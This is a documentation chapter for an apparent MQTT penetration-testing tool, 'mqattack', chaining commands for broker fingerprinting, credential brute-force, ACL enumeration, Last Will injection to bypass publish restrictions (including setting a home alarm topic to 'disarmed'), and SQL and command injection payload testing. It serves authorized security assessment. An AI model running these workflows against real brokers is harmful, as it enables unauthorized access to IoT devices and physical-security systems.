# Workflows

This chapter shows how to chain mqattack commands together for common
assessment scenarios.

## 1. Initial broker reconnaissance

Start every engagement with passive fingerprinting and metadata collection.

```bash
# Identify the broker
mqattack fingerprint -H 192.168.1.10 -w 10

# Collect all $SYS statistics
mqattack sys-info -H 192.168.1.10 -w 15

# Listen on all topics for 60 seconds to observe live traffic
mqattack subscribe -H 192.168.1.10 -t '#' -C 200
```

The `$SYS` tree reveals uptime, connected client counts, message throughput,
and sometimes build information - all without any active attack.

## 2. Anonymous access probe

Check whether the broker accepts unauthenticated connections before attempting
any brute-force.

```bash
mqattack brute-auth -H 192.168.1.10 --try-anonymous
```

If anonymous access is confirmed, run ACL checks immediately:

```bash
mqattack check-acl -H 192.168.1.10 -w topics.txt
```

## 3. Credential brute-force -> permission mapping

Find valid credentials, then map what each account can access.

```bash
# Step 1: brute-force with a credential list, stop on first hit
mqattack brute-auth -H 192.168.1.10 \
  --try-anonymous -c credentials.txt --stop-on-success

# Step 2: collect all successful credentials into a file
mqattack brute-auth -H 192.168.1.10 -c credentials.txt \
  | grep 'SUCCESS' | awk '{print $2}' > valid.txt

# Step 3: build the user × topic permission matrix
mqattack enum-perms -H 192.168.1.10 -c valid.txt -w topics.txt
```

## 4. Topic discovery -> ACL check

Discover which topics are active, then probe permissions on found topics.

```bash
# Step 1: discover topics with a wordlist
mqattack enum-topics -H 192.168.1.10 -w mqtt-topics.txt \
  | grep 'FOUND' | awk '{print $2}' > active-topics.txt

# Step 2: check ACL for each found topic
mqattack check-acl -H 192.168.1.10 -u admin -P secret \
  -w active-topics.txt
```

## 5. Last Will injection to bypass ACLs

When direct publish is denied but you want to inject a message into a topic:

```bash
# Confirm you cannot publish directly
mqattack check-acl -H 192.168.1.10 -u limited-user -P pass \
  -t 'home/alarm/status' --no-subscribe -q 1

# Inject via LWT (broker delivers on your behalf)
mqattack will-inject -H 192.168.1.10 -u limited-user -P pass \
  -t home/alarm/status -m 'disarmed' -r \
  --monitor home/alarm/status --monitor-wait 10
```

## 6. Injection payload testing with response capture

Test whether a subscribing application or backend processes MQTT messages
insecurely.

```bash
# Publish SQL and command injection payloads, capture any response
mqattack payload-inject -H 192.168.1.10 \
  -t device/input --set sql --set cmd \
  --monitor device/output --monitor-wait 15

# Follow up with MQTT-specific fault payloads
mqattack payload-inject -H 192.168.1.10 \
  -t device/input --set mqtt --monitor device/output
```

## 7. Full assessment pipeline

A complete assessment of a target broker in sequence:

```bash
TARGET=192.168.1.10

# 1. Fingerprint
mqattack fingerprint -H $TARGET -w 10 --verbose

# 2. Check anonymous access and collect topics
mqattack brute-auth -H $TARGET --try-anonymous
mqattack subscribe -H $TARGET -t '#' -C 50 | awk '{print $2}' | sort -u > found-topics.txt

# 3. Brute-force credentials
mqattack brute-auth -H $TARGET -c credentials.txt \
  | grep 'SUCCESS' | awk '{print $2}' > valid.txt

# 4. Map permissions for all valid users
mqattack enum-perms -H $TARGET -c valid.txt -w found-topics.txt

# 5. Test injection on writable topics
while IFS= read -r topic; do
  mqattack payload-inject -H $TARGET -t "$topic" --set all --delay 200
done < writable-topics.txt
```

## 8. TLS assessment

Verify that certificate validation is enforced:

```bash
# Should fail - do not skip verification
mqattack fingerprint -H broker.example.com -p 8883 --tls

# Does the broker accept connections without a valid cert?
mqattack fingerprint -H broker.example.com -p 8883 --insecure

# mTLS: does the broker require a client certificate?
mqattack fingerprint --cafile ca.crt -H broker.example.com -p 8883
# vs.
mqattack fingerprint --cafile ca.crt --cert client.crt --key client.key \
  -H broker.example.com -p 8883
```
